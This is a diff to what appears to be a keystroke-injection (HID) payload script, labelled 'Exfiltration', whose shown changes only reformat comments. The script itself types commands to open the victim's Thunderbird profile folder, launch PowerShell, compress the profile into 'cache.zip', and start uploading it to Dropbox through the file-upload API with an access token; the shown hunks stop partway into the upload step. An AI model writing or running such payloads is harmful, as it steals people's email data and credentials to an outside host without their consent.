@@ -1,22 +1,22 @@
-* REM ###############################################################
-* REM #                                                             #
-* REM # Title       : Save Your Thunderbird Settings via Dropbox    #
-* REM # Author      : Aleff                                         #
-* REM # Version     : 1.0                                           #
-* REM # Category    : Exfiltration                                  #
-* REM # Target      : Windows 10/11                                 #
-* REM #                                                             #
-* REM ###############################################################
+###############################################################
+#                                                             #
+# Title       : Save Your Thunderbird Settings via Dropbox    #
+# Author      : Aleff                                         #
+# Version     : 1.0                                           #
+# Category    : Exfiltration                                  #
+# Target      : Windows 10/11                                 #
+#                                                             #
+###############################################################
 
 ATTACKMODE HID
 
-* REM Variables Settings
+# Variables Settings
 ARCHIVE_NAME="cache.zip"
 ACCESS_TOKEN="aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj1Sdlk1cGxvbzFPSQ=="
 DROPBOX_FOLDER_PATH="/"
 DROPBOX_CONST_LINK="https://content.dropboxapi.com/2/files/upload"
 
-* REM Opening Thunderbird settings
+# Opening Thunderbird settings
 QUACK DELAY 1500
 QUACK GUI r
 QUACK STRING thunderbird
@@ -41,7 +41,7 @@ QUACK DELAY 500
 QUACK ENTER
 QUACK DELAY 500
 
-* REM Inside the settings
+# Inside the settings
 QUACK TAB
 QUACK TAB
 QUACK TAB
@@ -57,7 +57,7 @@ QUACK DELAY 500
 QUACK ENTER
 QUACK DELAY 500
 
-* REM Inside The Profile Folder
+# Inside The Profile Folder
 QUACK TAB
 QUACK TAB
 QUACK TAB
@@ -70,7 +70,7 @@ QUACK DELAY 500
 QUACK ALT F4
 QUACK DELAY 500
 
-* REM Powershell running...
+# Powershell running...
 QUACK GUI r
 QUACK STRING powershell
 QUACK ENTER
@@ -89,7 +89,7 @@ QUACK STRING  -DestinationPath ./$ARCHIVE_NAME
 QUACK ENTER
 QUACK DELAY 1000
 
-* REM Exfiltration via Dropbox
+# Exfiltration via Dropbox
 QUACK STRING $filePath = \"$env:TEMP/$ARCHIVE_NAME\"
 QUACK ENTER
 QUACK DELAY 500
